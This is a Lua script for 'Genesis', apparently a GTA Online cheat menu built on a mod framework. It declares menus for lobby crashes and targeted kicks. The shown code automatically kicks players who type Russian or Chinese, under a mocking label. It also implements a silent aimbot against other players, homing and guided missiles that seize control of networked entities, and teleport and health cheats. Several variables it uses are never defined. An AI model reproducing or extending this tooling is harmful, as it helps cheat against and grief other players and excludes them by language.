--[[Online Menu]]--
MenuOnline = menu.list(menu.my_root(), "Online", {""}, "Online Options.") ; menu.divider(MenuOnline, "Online Options")
    --[[Online Menu Subcategories]]--
    MenuOnlineAll = menu.list(MenuOnline, "All Players", {""}, "All Players Options.") ; menu.divider(MenuOnlineAll, "All Players Options")
    MenuOnlineTK = menu.list(MenuOnline, "Targeted Kick Options", {""}, "Targeted Kick Options.") ; menu.divider(MenuOnlineTK, "Targeted Kick Options")
    MenuProtection = menu.list(MenuOnline, "Protections", {""}, "Protection Options.") ; menu.divider(MenuProtection, "Protection Options")
    MenuLobby = menu.list(MenuOnline, "Lobby Crashes", {""}, "Lobby Crash Options.") ;menu.divider(MenuLobby, "Lobby Crash Options")
    MenuDetections = menu.list(MenuOnline, "Detections", {""}, "Detection Options.") ;menu.divider(MenuDetections, "Detections")
    MenuModderDetections = menu.list(MenuOnline, "Modder Detections", {""}, "Modder Detection Options.") ;menu.divider(MenuModderDetections, "Modder Detections")
    MenuNetwork = menu.list(MenuOnline, "Network", {""}, "Network Options.") ;menu.divider(MenuNetwork, "Network Options")
    MenuSession = menu.list(MenuOnline, "Session", {""}, "Session Options.") ;menu.divider(MenuSession, "Session Options")

local functions = require('lib.Genesis.functions')
local api = require('lib.Genesis.api')

local scriptHome = filesystem.scripts_dir() .. "/Genesis/"
local debug_file_path = scriptHome .. "debug.txt"
local blacklist_file_path = scriptHome .. "antirus.txt"

functions.create_directory(scriptHome)
functions.generate_blacklist(blacklist_file_path)

local log_chat_toggle = false
local kick_prohibited_chat_toggle = false

local blacklist = functions.load_blacklist(blacklist_file_path)

local main_menu = menu.my_root()

local Genesis_menu = menu.list(MenuOnline, "Anti-Player", {}, "Anti Player Features")

Genesis_menu:toggle("Kick *Russian&Chinese* Nuisances", {}, "Kick nuisances typing in ruscheese (*Russian & Chinese!*", function(state)
    kick_prohibited_chat_toggle = state
    functions.log_debug("Kick Russian & Chinese toggled: " .. tostring(state), debug_file_path)
    util.toast("Kick Russian & Chinese toggled: " .. tostring(state))
end, false)

chat.on_message(function(packet_sender, message_sender, message_text, is_team_chat)
    local player_name = players.get_name(message_sender)
    functions.log_debug("Chat message received - Player: " .. player_name .. ", Message: " .. message_text, debug_file_path)
    if log_chat_toggle then
        api.log_chat_to_file(chat_log_file_path, player_name, message_text)
    end
    if kick_prohibited_chat_toggle then
        api.kick_if_prohibited_characters(player_name, message_text, debug_file_path, blacklist)
    end
    if detect_ip_toggle then
        api.detect_ip_and_respond(player_name, message_text, message_sender, debug_file_path)
    end
end)




--[[World Menu]]--
MenuWorld = menu.list(menu.my_root(), "World", {""}, "World Options.") ; menu.divider(MenuWorld, "World Options")
    --[[World Menu Subcategories]]--
    MenuWorldVeh = menu.list(MenuWorld, "Global Vehicle Options", {""}, "Global Vehicle Options.") ; menu.divider(MenuWorldVeh, "Global Vehicle Options")
    MenuWorldClear = menu.list(MenuWorld, "Clear", {""}, "World Clear Options.") ; menu.divider(MenuWorldClear, "World Clear Options")
        MenuWorldClearSpec = menu.list(MenuWorldClear, "Specific", {""}, "Specific Clear Options.") ; menu.divider(MenuWorldClearSpec, "Specific Clear Options")
    MenuWrldProj = menu.list(MenuWorld, "Projectile", {""}, "Projectile Options.") ; menu.divider(MenuWrldProj, " World Projectile Options")
        MenuWrldProjMarking = menu.list(MenuWrldProj, "Projectile Marking", {""}, "Projectile Marking Options.") ; menu.divider(MenuWrldProjMarking, "Projectile Marking Options")    
            MenuWrldProjOptions = menu.list(MenuWrldProjMarking, "Mark Projectiles", {""}, "Mark Projectile Options.") ; menu.divider(MenuWrldProjOptions, "Mark Projectile Options")
            MenuWrldProjColours = menu.list(MenuWrldProjMarking, "Mark Projectile Colours", {""}, "Mark Projectile Colour Options.") ; menu.divider(MenuWrldProjColours, "Mark Projectile Colour Options")
        MenuWrldProjMovement = menu.list(MenuWrldProj, "Projectile Movement", {""}, "Projectile Movement Options.") ; menu.divider(MenuWrldProjMovement, "Projectile Movement Options")
    MenuWrldChaos = menu.list(MenuWorld, "Chaos", {""}, "Chaos Options.") ; menu.divider(MenuWrldChaos, "Chaos Options")

--[[Game Menu]]--
MenuGame = menu.list(menu.my_root(), "Game", {""}, "Game Options.") ; menu.divider(MenuGame, "Game Options")
    --[[Game Menu Subcategories]]
    MenuAlerts = menu.list(MenuGame, "Fake Alerts", {""}, "Fake Alert Options.") ; menu.divider(MenuAlerts, "Fake Alert Options")
    MenuGameMacros = menu.list(MenuGame, "Macro Options", {""}, "Similar to AHK Macros, just Running in the Game so there's Never any Input Lag.") ; menu.divider(MenuGameMacros, "Macro Options")
        
--[[Menu Genesis]]--
MenuMisc = menu.list(menu.my_root(), "Genesis", {""}, "Genesis Options.") ; menu.divider(MenuMisc, "Genesis")
    --[[Menu Genesis Subcategories]]--
    MenuCredits = menu.list(MenuMisc, "Credits", {""}, "Credits for the Developer and Supporters of Genesis.") ; menu.divider(MenuCredits, "")



    --[[Session Menu]]--




--[[ ||| THREADS ||| ]]--

rgb_thread = util.create_thread(function(thr)
    local r = 255
    local g = 0
    local b = 0
    rgb = {255, 0, 0}
    while true do  
        --Smooth RGB--
        if r > 0 and g < 255 and b == 0 then
            r = r - 1
            g = g + 1
        elseif r == 0 and g > 0 and b < 255 then
            g = g - 1
            b = b + 1
        elseif r < 255 and b > 0 then
            r = r + 1
            b = b - 1
        end
        randR = r
        randG = g
        randB = b
        util.yield()
    end
end)

trgb_thread = util.create_thread(function(thr)
    tr, tg, tb = 0, 0, 0
    while 1 do
        --True RGB-- 
        tr, tg, tb = 255, 0, 0 -- Red
        util.yield(500)
        tr, tg, tb = 255, 100, 20 -- Orange
        util.yield(500)
        tr, tg, tb = 255, 255, 0 -- Yellow
        util.yield(500)
        tr, tg, tb = 0, 255, 0 -- Green
        util.yield(500)
        tr, tg, tb = 0, 0, 255 -- Blue
        util.yield(500)
        tr, tg, tb = 70, 20, 255 -- Indigo / Purple
        util.yield(500)
        tr, tg, tb = 255, 0, 255 -- Violet / Pink
        util.yield(500)
    end
end)
 
projecileBlipThread = util.create_thread(function(thr)
    local projectile_blips = {}
    while 1 do
        for k,b in pairs(projectile_blips) do
            if HUD.GET_BLIP_INFO_ID_ENTITY_INDEX(b) == 0 then 
                util.remove_blip(b) 
                projectile_blips[k] = nil
            end
        end
        if object_uses > 0 then
            if blip_projectiles then
                all_objects = entities.get_all_objects_as_handles()
                for k,obj in pairs(all_objects) do
                    if is_entity_a_missle(ENTITY.GET_ENTITY_MODEL(obj)) and blip_proj_missles and HUD.GET_BLIP_FROM_ENTITY(obj) == 0 then --Mark Missles
                        local proj_blip_missle = HUD.ADD_BLIP_FOR_ENTITY(obj)
                        HUD.SET_BLIP_SPRITE(proj_blip_missle, 548) --Missle Icon ID
                        HUD.SET_BLIP_COLOUR(proj_blip_missle, proj_blip_missle_col)
                        projectile_blips[#projectile_blips + 1] = proj_blip_missle
                    end
                    if is_entity_a_bomb(ENTITY.GET_ENTITY_MODEL(obj)) and blip_proj_bombs and HUD.GET_BLIP_FROM_ENTITY(obj) == 0 then --Mark Bombs
                        local proj_blip_bomb = HUD.ADD_BLIP_FOR_ENTITY(obj)
                        HUD.SET_BLIP_SPRITE(proj_blip_bomb, 368) --Bomb Icon ID
                        HUD.SET_BLIP_COLOUR(proj_blip_bomb, proj_blip_bomb_col)                                  
                        projectile_blips[#projectile_blips + 1] = proj_blip_bomb
                    end
                    if is_entity_a_grenade(ENTITY.GET_ENTITY_MODEL(obj)) and blip_proj_grenades and HUD.GET_BLIP_FROM_ENTITY(obj) == 0 then --Mark Grenades
                        local proj_blip_grenade = HUD.ADD_BLIP_FOR_ENTITY(obj)
                        HUD.SET_BLIP_SPRITE(proj_blip_grenade, 486) --Grenade Icon ID
                        HUD.SET_BLIP_COLOUR(proj_blip_grenade, proj_blip_grenade_col)
                        projectile_blips[#projectile_blips + 1] = proj_blip_grenade
                    end
                    if is_entity_a_mine(ENTITY.GET_ENTITY_MODEL(obj)) and blip_proj_mines and HUD.GET_BLIP_FROM_ENTITY(obj) == 0 then --Mark Mines
                        local proj_blip_mine = HUD.ADD_BLIP_FOR_ENTITY(obj)
                        HUD.SET_BLIP_SPRITE(proj_blip_mine, 653) --Mine Icon ID
                        HUD.SET_BLIP_COLOUR(proj_blip_mine, proj_blip_mine_col)
                        projectile_blips[#projectile_blips + 1] = proj_blip_mine 
                    end
                    if is_entity_a_miscprojectile(ENTITY.GET_ENTITY_MODEL(obj)) and blip_proj_misc and HUD.GET_BLIP_FROM_ENTITY(obj) == 0 then --Mark Misc Projectiles
                        local proj_blip_misc = HUD.ADD_BLIP_FOR_ENTITY(obj)
                        HUD.SET_BLIP_SPRITE(proj_blip_misc, 364) --Misc Projectile Icon ID
                        HUD.SET_BLIP_COLOUR(proj_blip_misc, proj_blip_misc_col)
                        projectile_blips[#projectile_blips + 1] = proj_blip_misc 
                    end
                end
            end
        end
        util.yield()
    end
end)

objects_thread = util.create_thread(function(thr)
    while true do
        if object_uses > 0 then
            all_objects = entities.get_all_objects_as_handles()
            for k,obj in pairs(all_objects) do
                if is_entity_a_projectile_all(ENTITY.GET_ENTITY_MODEL(obj)) then  --Edit Proj Offsets Here
                    if projectile_spaz then 
                        local strength = 20
                        ENTITY.APPLY_FORCE_TO_ENTITY(obj, 1, math.random(-strength, strength), math.random(-strength, strength), math.random(-strength, strength), 0.0, 0.0, 0.0, 1, true, false, true, true, true)
                    end
                    if slow_projectiles then
                        ENTITY.SET_ENTITY_MAX_SPEED(obj, 0.5)
                    end
                    if vehicle_APS then
                        local gce_all_objects = entities.get_all_objects_as_handles()
                        local Range = CountermeasureAPSrange
                        local RangeSq = Range * Range
                        local EntitiesToTarget = {}
                        for index, entity in pairs(gce_all_objects) do
                            if is_entity_a_missle(ENTITY.GET_ENTITY_MODEL(entity)) or is_entity_a_grenade(ENTITY.GET_ENTITY_MODEL(entity)) then
                                local EntityCoords = ENTITY.GET_ENTITY_COORDS(entity)
                                local LocalCoords = ENTITY.GET_ENTITY_COORDS(players.user_ped())
                                local VehCoords = ENTITY.GET_ENTITY_COORDS(player_cur_car)
                                local ObjPointers = entities.get_all_objects_as_pointers()
                                local vdist = SYSTEM.VDIST2(VehCoords.x, VehCoords.y, VehCoords.z, EntityCoords.x, EntityCoords.y, EntityCoords.z)
                                if vdist <= RangeSq then
                                    EntitiesToTarget[#EntitiesToTarget+1] = entities.pointer_to_handle(ObjPointers[index])
                                end
                                if EntitiesToTarget ~= nil then
                                    local dist = 999999
                                    for i = 1, #EntitiesToTarget do
                                        local tarcoords = ENTITY.GET_ENTITY_COORDS(EntitiesToTarget[index])
                                        local e = SYSTEM.VDIST2(VehCoords.x, VehCoords.y, VehCoords.z, EntityCoords.x, EntityCoords.y, EntityCoords.z)
                                        if e < dist then
                                            dist = e
                                            closest_entity = EntitiesToTarget[index]
                                            local closestEntity = entity
                                            local ProjLocation = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(closestEntity, 0, 0, 0)
                                            local ProjRotation = ENTITY.GET_ENTITY_ROTATION(closestEntity)
                                            local lookAtProj = v3.lookAt(VehCoords, EntityCoords)
                                            STREAMING.REQUEST_NAMED_PTFX_ASSET("scr_sm_counter")
                                            STREAMING.REQUEST_NAMED_PTFX_ASSET("core") 
                                            STREAMING.REQUEST_NAMED_PTFX_ASSET("weap_gr_vehicle_weapons")
                                            if STREAMING.HAS_NAMED_PTFX_ASSET_LOADED("scr_sm_counter") and STREAMING.HAS_NAMED_PTFX_ASSET_LOADED("core") and STREAMING.HAS_NAMED_PTFX_ASSET_LOADED("veh_xs_vehicle_mods") then
                                                ENTITY.SET_ENTITY_ROTATION(entity, lookAtProj.x - 180, lookAtProj.y, lookAtProj.z, 1, true)
                                                lookAtPos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(entity, 0, Range - 2, 0)
                                                GRAPHICS.USE_PARTICLE_FX_ASSET("scr_sm_counter")
                                                GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD("scr_sm_counter_chaff", ProjLocation.x, ProjLocation.y, ProjLocation.z, ProjRotation.x + 90, ProjRotation.y, ProjRotation.z, 1, 0, 0, 0)
                                                GRAPHICS.USE_PARTICLE_FX_ASSET("core")
                                                GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD("exp_grd_sticky", ProjLocation.x, ProjLocation.y, ProjLocation.z, ProjRotation.x - 90, ProjRotation.y, ProjRotation.z, 0.2, 0, 0, 0)
                                                GRAPHICS.USE_PARTICLE_FX_ASSET("weap_gr_vehicle_weapons")
                                                GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD("muz_mounted_turret_apc_missile", lookAtPos.x, lookAtPos.y, lookAtPos.z + .2, lookAtProj.x + 180, lookAtProj.y, lookAtProj.z, 1.3, 0, 0, 0)
                                                GRAPHICS.USE_PARTICLE_FX_ASSET("weap_gr_vehicle_weapons")
                                                GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD("muz_mounted_turret_apc", lookAtPos.x, lookAtPos.y, lookAtPos.z + .2, lookAtProj.x + 180, lookAtProj.y, lookAtProj.z, 1.3, 0, 0, 0)
                                                GRAPHICS.USE_PARTICLE_FX_ASSET("weap_gr_vehicle_weapons")
                                                GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD("muz_mounted_turret_apc_missile", lookAtPos.x, lookAtPos.y, lookAtPos.z + .2, lookAtProj.x + 180, lookAtProj.y, lookAtProj.z, 1.3, 0, 0, 0)
                                                GRAPHICS.USE_PARTICLE_FX_ASSET("weap_gr_vehicle_weapons")
                                                GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD("muz_mounted_turret_apc", lookAtPos.x, lookAtPos.y, lookAtPos.z + .2, lookAtProj.x + 180, lookAtProj.y, lookAtProj.z, 1.3, 0, 0, 0)
                                                entities.delete_by_handle(entity)
                                                APS_charges = APS_charges - 1
                                                util.toast("-Genesis-\n\nAPS Destroyed Incoming Projectile.\n"..APS_charges.."/"..CountermeasureAPSCharges.."  APS Shells Left.")
                                                if APS_charges == 0 then
                                                    util.toast("-Genesis-\n\nNo APS Shells Left. Reloading...")
                                                    util.yield(CountermeasureAPSTimeout)
                                                    APS_charges = CountermeasureAPSCharges
                                                    util.toast("-Genesis-\n\nAPS Ready.")
                                                end
                                            else
                                                for i = 0, 10, 1 do
                                                    STREAMING.REQUEST_NAMED_PTFX_ASSET("scr_sm_counter")
                                                    STREAMING.REQUEST_NAMED_PTFX_ASSET("core") 
                                                    STREAMING.REQUEST_NAMED_PTFX_ASSET("veh_xs_vehicle_mods")
                                                end
                                                if not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED("scr_sm_counter") or STREAMING.HAS_NAMED_PTFX_ASSET_LOADED("core") or STREAMING.HAS_NAMED_PTFX_ASSET_LOADED("veh_xs_vehicle_mods") then
                                                    util.toast("-Genesis-\n\nCould not Load Particle Effect.")
                                                end
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end
                    if homing_missles then
                        local localped = players.user_ped()
                        local localcoords = ENTITY.GET_ENTITY_COORDS(players.user_ped())
                        local forOffset = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(localped, 0, 5, 0)
                        RRocket = OBJECT.GET_CLOSEST_OBJECT_OF_TYPE(forOffset.x, forOffset.y, forOffset.z, 10, HomingM_SelectedMissle, false, true, true, true)
                        local p
                        p = GetClosestPlayerWithRange_Whitelist(homing_missle_range, false)
                        local ppcoords = ENTITY.GET_ENTITY_COORDS(p)
                        util.create_thread(function ()
                            local plocalized = p
                            local msl = RRocket
                            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(msl)
                            if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(msl) then
                                for i = 1, 10 do
                                    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(msl)
                                end
                            end
                            if not PED.IS_PED_DEAD_OR_DYING(plocalized) then
                                while ENTITY.DOES_ENTITY_EXIST(msl) do
                                    local pcoords2 = ENTITY.GET_ENTITY_COORDS(plocalized)
                                    local pcoords = GetTableFromV3Instance(pcoords2)
                                    local lc2 = ENTITY.GET_ENTITY_COORDS(msl)
                                    local lc = GetTableFromV3Instance(lc2)
                                    local look2 = v3.lookAt(lc2, pcoords2)
                                    local look = GetTableFromV3Instance(look2)
                                    local dir2 = v3.toDir(look2)
                                    local dir = GetTableFromV3Instance(dir2) 
                                    if ENTITY.DOES_ENTITY_EXIST(msl) then
                                        if (ENTITY.HAS_ENTITY_CLEAR_LOS_TO_ENTITY(msl, plocalized, 17)) then
                                            ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(msl, 1, 0, 1, 0, true, true, false, true)
                                            ENTITY.SET_ENTITY_ROTATION(msl, look.x, look.y, look.z, 2, true)
                                        end
                                    end
                                    util.yield()
                                end  
                            end   
                        end)
                    end
                    if missle_MCLOS then
                        local localped = players.user_ped()
                        local localcoords = ENTITY.GET_ENTITY_COORDS(players.user_ped())
                        local forOffset = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(localped, 0, 5, 0)
                        RRocket = OBJECT.GET_CLOSEST_OBJECT_OF_TYPE(forOffset.x, forOffset.y, forOffset.z, 10, MCLOS_SelectedMissle, false, true, true, true)
                        local mclos_msl_rot = ENTITY.GET_ENTITY_ROTATION(RRocket)
                        local mclos_look_r = mclos_msl_rot.x
                        local mclos_look_p = mclos_msl_rot.y
                        local mclos_look_y = mclos_msl_rot.z
                        util.create_thread(function ()
                            local msl = RRocket
                            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(msl)
                            if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(msl) then
                                for i = 1, 10 do
                                    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(msl)
                                end
                            end     
                            while ENTITY.DOES_ENTITY_EXIST(msl) do       
                                if ENTITY.GET_ENTITY_SPEED(msl) == 0 then
                                    local mclos_msl_rot = ENTITY.GET_ENTITY_ROTATION(RRocket)
                                    mclos_look_p = mclos_msl_rot.x
                                    mclos_look_r = mclos_msl_rot.y
                                    mclos_look_y = mclos_msl_rot.z
                                end  
                                if ENTITY.DOES_ENTITY_EXIST(msl) then
                                    if not MCLOS_mouseControl then
                                        if PAD.IS_CONTROL_PRESSED(MCLOS_controlModeU, MCLOS_controlModeU) then --Nmp 8
                                            mclos_look_p = mclos_look_p + MCLOS_TurnSpeed
                                            ENTITY.SET_ENTITY_ROTATION(msl, mclos_look_p, 0, mclos_look_y, 1, true)
                                        end
                                        if PAD.IS_CONTROL_PRESSED(MCLOS_controlModeD, MCLOS_controlModeD) then --Nmp 5
                                            mclos_look_p = mclos_look_p - MCLOS_TurnSpeed
                                            ENTITY.SET_ENTITY_ROTATION(msl, mclos_look_p, 0, mclos_look_y, 1, true)
                                        end
                                        if PAD.IS_CONTROL_PRESSED(MCLOS_controlModeL, MCLOS_controlModeL) then --Nmp 4
                                            mclos_look_y = mclos_look_y + MCLOS_TurnSpeed
                                            ENTITY.SET_ENTITY_ROTATION(msl, mclos_look_p, 0, mclos_look_y, 1, true)
                                        end
                                        if PAD.IS_CONTROL_PRESSED(MCLOS_controlModeR, MCLOS_controlModeR) then --Nmp 6
                                            mclos_look_y = mclos_look_y - MCLOS_TurnSpeed
                                            ENTITY.SET_ENTITY_ROTATION(msl, mclos_look_p, 0, mclos_look_y, 1, true)
                                        end
                                        ENTITY.SET_ENTITY_ROTATION(msl, mclos_look_p, 0, mclos_look_y, 1, true)
                                        ENTITY.APPLY_FORCE_TO_ENTITY(msl, 1, 0, 1, 0, 0, 0, 0, 1, true, false, false, true, true)
                                        ENTITY.SET_ENTITY_MAX_SPEED(msl, MCLOS_MaxSpeed)
                                        --ENTITY.APPLY_FORCE_TO_ENTITY(msl, 1, 0, 1, 0, true, true, false, true)
                                    else
                                        local MCOLS_mouseHorizontal = PAD.GET_CONTROL_NORMAL(1, 1)
                                        local MCOLS_mouseVertical = PAD.GET_CONTROL_NORMAL(2, 2)
                                        if MCOLS_mouseVertical < 0 then -- Mouse Up
                                            mclos_look_p = mclos_look_p + (MCLOS_TurnSpeed / 4)
                                            ENTITY.SET_ENTITY_ROTATION(msl, mclos_look_p, 0, mclos_look_y, 1, true)
                                        end
                                        if MCOLS_mouseVertical > 0 then --Mouse Down
                                            mclos_look_p = mclos_look_p - (MCLOS_TurnSpeed / 4)
                                            ENTITY.SET_ENTITY_ROTATION(msl, mclos_look_p, 0, mclos_look_y, 1, true)
                                        end
                                        if MCOLS_mouseHorizontal < 0 then -- Mouse Left
                                            mclos_look_y = mclos_look_y + (MCLOS_TurnSpeed / 4)
                                            ENTITY.SET_ENTITY_ROTATION(msl, mclos_look_p, 0, mclos_look_y, 1, true)
                                        end
                                        if MCOLS_mouseHorizontal > 0 then -- Mouse Right
                                            mclos_look_y = mclos_look_y - (MCLOS_TurnSpeed / 4)
                                            ENTITY.SET_ENTITY_ROTATION(msl, mclos_look_p, 0, mclos_look_y, 1, true)
                                        end
                                    end
                                end
                                util.yield()
                            end 
                        end)
                    end 
                    if missle_SACLOS then                                                       
                        local localped = players.user_ped()
                        local localcoords = ENTITY.GET_ENTITY_COORDS(players.user_ped())
                        local forOffset = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(localped, 0, 5, 0)
                        RRocket = OBJECT.GET_CLOSEST_OBJECT_OF_TYPE(forOffset.x, forOffset.y, forOffset.z, 10, SACLOS_SelectedMissle, false, true, true)
                        util.create_thread(function ()
                            local msl = RRocket
                            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(msl)
                            if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(msl) then
                                for i = 1, 10 do
                                    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(msl)
                                end
                            end     
                            while ENTITY.DOES_ENTITY_EXIST(msl) do       
                                local rc = raycast_gameplay_cam(-1, 1000000.0)[2]
                                local lc2 = ENTITY.GET_ENTITY_COORDS(msl)
                                local lc = GetTableFromV3Instance(lc2)
                                local look2 = v3.lookAt(lc2, rc)
                                local look = GetTableFromV3Instance(look2)
                                if ENTITY.GET_ENTITY_SPEED(msl) == 0 then
                                    goto CONTINUE
                                end
                                if SACLOS_drawLaser then
                                    local LaserStartCoords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), 0, 0, 0)
                                    GRAPHICS.DRAW_LINE(LaserStartCoords.x, LaserStartCoords.y, LaserStartCoords.z, rc.x, rc.y, rc.z, 0, 50, 255, 150)
                                    util.yield()
                                end
                                if ENTITY.DOES_ENTITY_EXIST(msl) then
                                    ENTITY.SET_ENTITY_ROTATION(msl, look.x, look.y, look.z, 1, true)
                                    ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(msl, 1, 0, 1, 0, true, true, false, true)
                                    ENTITY.SET_ENTITY_MAX_SPEED(msl, SACLOS_MaxSpeed)
                                end
                                ::CONTINUE::
                                util.yield()
                            end 
                        end)
                    end
                end
            end
        end
        util.yield()
    end
end)




--[[ ||| ALL ACTIONS ||| ]]--

--[[| Self/Movement/Main/ |]]--
menu.slider(MenuMainMovement, "Player Speed", {"gsplayerspeed"}, "Sets your Walk, Run and Swim Speed Via a Multiplier.", -1000, 1000, 1, 1, function(value)
    local MultipliedValue = value * 100
    menu.set_value(menu.ref_by_path("Self>Movement>Swim Speed", 38), MultipliedValue)
    menu.set_value(menu.ref_by_path("Self>Movement>Walk And Run Speed", 38), MultipliedValue)
end)

menu.toggle(MenuMainMovement, "Super Jump", {"gssuperjump"}, "Makes you Jump very High. Detected by Most Menus.", function(on)
    menu.trigger_command(menu.ref_by_command_name("superjump"))
end)


--[[| Self/Movement/Teleport/ |]]--
tpf_units = 0.5
menu.action(MenuTeleport, "TP Forward", {"gstpforward"}, "Teleports you Forward the Selected Amount of Units. Goot for Going through Thin Objects like Walls or Doors.", function(on_click)
    local pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.PLAYER_PED_ID(), 0, tpf_units, 0)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.PLAYER_PED_ID(), pos['x'], pos['y'], pos['z'], true, false, false)
end)

menu.slider(MenuTeleport, "TP Forward Units", {"gstpforwardunits"}, "Number of Units to Teleport when using 'TP Forward' Command.", 5, 100, 1, 1, function(s)
    tpf_units = s*0.1
end)

menu.action(MenuTeleport, "Teleport to Waypoint", {"gstpwaypoint"}, "Teleports you to the Waypoint you have set.", function(on_click)
    menu.trigger_command(menu.ref_by_command_name("tpwp"))
end)

menu.action(MenuTeleport, "Smooth Teleport", {"gsstpwaypoint"}, "'Teleport to Waypoint' but with a Smooth Camera Transtiton in Between.", function ()
    SmoothTeleportToCord(Get_Waypoint_Pos2(), false)
end)
menu.slider(MenuTeleport, "Smooth Teleport Speed", {"gsstpspeed"}, "Speed of the Camera Transition when Using Smooth Teleport.", 1, 100, 10, 1, function(value)
    local multiply = value / 10
    STP_SPEED_MODIFIER = 0.02
    STP_SPEED_MODIFIER = STP_SPEED_MODIFIER * multiply
end)
menu.slider(MenuTeleport, "Smooth Teleport Height", {"gsstpheight"}, "Height of the Camera During the Transition.", 0, 10000, 300, 10, function (value)
    local height = value
    STP_COORD_HEIGHT = height
end)


--[[| Self/Health/ |]]--
menu.action(MenuHealth, "Full Health", {"gsfullhealth"}, "Completely Refills your Health.", function()
	local maxHealth = PED.GET_PED_MAX_HEALTH(players.user_ped())
	ENTITY.SET_ENTITY_HEALTH(players.user_ped(), maxHealth, 0)
end)

menu.action(MenuHealth, "Full Armour", {"gsfullarmour"}, "Completely Refills your Armour.", function()
	local armour = util.is_session_started() and 50 or 100
	PED.SET_PED_ARMOUR(players.user_ped(), armour)
end)


--[[| Self/Weapon/Hotswap/ |]]--
LegitRapidFire = false
LegitRapidMS = 100
menu.toggle(MenuWeaponHotswap, "Hotswap", {"gshotswap"}, "Quickly Switches to your C4 and Back to Shoot Certain Weapons Faster.\nMake sure to have C4/Sticky Bomb in your Inventory or this won't Work!", function(on)
    local localped = players.user_ped()
    if on then
        LegitRapidFire = true
        util.create_thread(function ()
            while LegitRapidFire do
                if PED.IS_PED_SHOOTING(localped) then
                    local curWepMem = memory.alloc()
                    WEAPON.GET_CURRENT_PED_WEAPON(localped, curWepMem, 1)
                    local currentWeapon = memory.read_int(curWepMem)
                    memory.free(curWepMem)
                    WEAPON.SET_CURRENT_PED_WEAPON(localped, 741814745, LegitSwitchA1) --741814745 is C4
                    util.yield(LegitRapidMS)
                    WEAPON.SET_CURRENT_PED_WEAPON(localped, currentWeapon, LegitSwitchA2)
                end
                util.yield()
            end
            util.stop_thread()
        end)
    else
        LegitRapidFire = false
    end
end)

menu.slider(MenuWeaponHotswap, "Hotswap Mode", {"gshotswapmode"}, "Wether to Skip the Weapon Switch Animation or to Play Through it.\\n\n1 - Non-Legit; Skip Both Animations\n2 - Semi-Legit; Skip One Animation\n3 - Full-Legit; Don't Skip any Animations", 1, 3, 1, 1, function(value)
    if value == 1 then LegitSwitchA1 = true ; LegitSwitchA2 = true
    elseif value == 2 then LegitSwitchA1 = false ; LegitSwitchA2 = true
    elseif value == 3 then LegitSwitchA1 = false ; LegitSwitchA2 = false end 
end)

menu.slider(MenuWeaponHotswap, "Hotswap Delay", {"gshotswapdelay"}, "The Delay Between Switching to C4 and Back.\nValues Under 200 won't Work if using Legit Mode, Due to being Too Fast!", 1, 1000, 100, 50, function(value)
    LegitRapidMS = value
end)


--[[| Self/Weapon/SilentAimbot/ |]]--
silentAimMode = "closest"
menu.toggle_loop(MenuWeaponSAim, "Silent Aimbot", {"gssilentaim"}, "Aimbots Players without actually Snapping your Camera to them.", function(toggle)
    local target = GetSilentAimTarget()
    if target ~= 0 then
        local localPedPos = ENTITY.GET_ENTITY_COORDS(players.user_ped(), false)
        local localHeadPos = PED.GET_PED_BONE_COORDS(players.user_ped(), 31086, 0, 0, 0)
        local targetPos = PED.GET_PED_BONE_COORDS(target, 24818, 0, .5, 0)
        local targetPos2 = PED.GET_PED_BONE_COORDS(target, 24818, 0, 0, 0)
        if showSAimTarget then
            GRAPHICS.DRAW_LINE(localPedPos['x'], localPedPos['y'], localPedPos['z'], targetPos2['x'], targetPos2['y'], targetPos2['z'], 255, 0, 0, 150)
        end
        if sAimAutoShoot then
            PAD.SET_CONTROL_VALUE_NEXT_FRAME(24, 24, 1.0)
        end
        if PED.IS_PED_SHOOTING(players.user_ped()) then
            local wep = WEAPON.GET_SELECTED_PED_WEAPON(players.user_ped())
            local dmg = WEAPON.GET_WEAPON_DAMAGE(wep, 0)
            local veh = PED.GET_VEHICLE_PED_IS_IN(target, false)
            if sAimMode == 1 then
                MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY(targetPos['x'], targetPos['y'], targetPos['z'], targetPos2['x'], targetPos2['y'], targetPos2['z'], dmg, true, wep, players.user_ped(), true, false, 100, veh)
            else
                MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY(localHeadPos['x'], localHeadPos['y'], localHeadPos['z'], targetPos2['x'], targetPos2['y'], targetPos2['z'], dmg, true, wep, players.user_ped(), true, false, 100, veh)
            end
        end
    end
end)

sAimMode = 1
